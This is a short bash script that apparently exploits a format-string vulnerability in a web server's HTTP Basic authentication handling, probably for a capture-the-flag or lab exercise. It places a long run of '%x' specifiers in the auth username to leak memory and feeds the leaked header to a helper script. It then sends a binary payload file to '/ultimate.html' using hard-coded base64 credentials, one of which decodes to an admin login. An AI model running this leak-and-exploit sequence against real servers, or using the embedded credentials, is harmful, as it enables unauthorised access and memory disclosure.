# $ bash curl1.sh 2272 232



auth_local="dGVzdDp0ZXN0"
auth_chatzi="YWRtaW46Ym9iJ3MgeW91ciB1bmNsZQ=="

if [ $# -eq 3 ]; then
	auth=$auth_local
else
	auth=$auth_chatzi
fi


get_payload="'Hello  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x :dsa'"

curl -v 'http://localhost:8000/' -u "${get_payload}" -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' --compressed \
-H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0, no-cache' \
-H 'Origin: http://localhost:8000' -H 'Pragma: no-cache' 2> out_temp.txt

echo 'kek' > out_temp2.txt

cat out_temp.txt | grep "WWW" >> out_temp2.txt
cat out_temp2.txt | python3 process_answer.py 0 $1 $2

rm -f out_temp.txt out_temp2.txt 

curl -v 'http://localhost:8000/ultimate.html' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' \
-H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Authorization: Basic '$auth -H 'Connection: keep-alive' \
-H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0, no-cache' -H 'Origin: http://localhost:8000' -H 'Pragma: no-cache' \
-H 'Content-Length: 15' --data-binary '@full_payload.bin'
